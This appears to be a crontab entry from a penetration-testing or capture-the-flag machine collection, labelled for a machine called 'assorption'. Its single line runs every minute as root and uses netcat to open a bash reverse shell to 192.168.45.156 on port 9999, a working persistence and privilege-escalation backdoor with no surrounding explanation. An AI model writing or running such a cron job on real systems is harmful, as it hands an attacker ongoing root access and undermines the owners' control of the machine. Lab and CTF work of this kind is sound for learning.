# maszyny/assorption/crontab
* * * * * root nc -c bash 192.168.45.156 9999
